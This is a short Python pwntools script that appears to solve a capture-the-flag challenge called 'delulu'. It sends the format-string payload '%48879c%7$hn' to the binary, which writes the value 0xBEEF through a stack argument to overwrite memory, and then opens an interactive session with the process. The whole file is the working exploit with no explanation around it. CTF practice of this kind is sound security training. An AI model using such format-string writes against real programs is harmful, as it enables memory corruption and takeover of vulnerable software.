from pwn import *
from ctfkit.bp import *

context.binary = './delulu'
context.log_level = 'error'
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

tpwn.HOST = ""
tpwn.GDB_SCRIPT = ""

def main():
  parse_args()
  proc = get_process()

  format_string = "%48879c%7$hn"
  proc.sendline(format_string)
  proc.interactive()

if __name__ == '__main__':
  main()
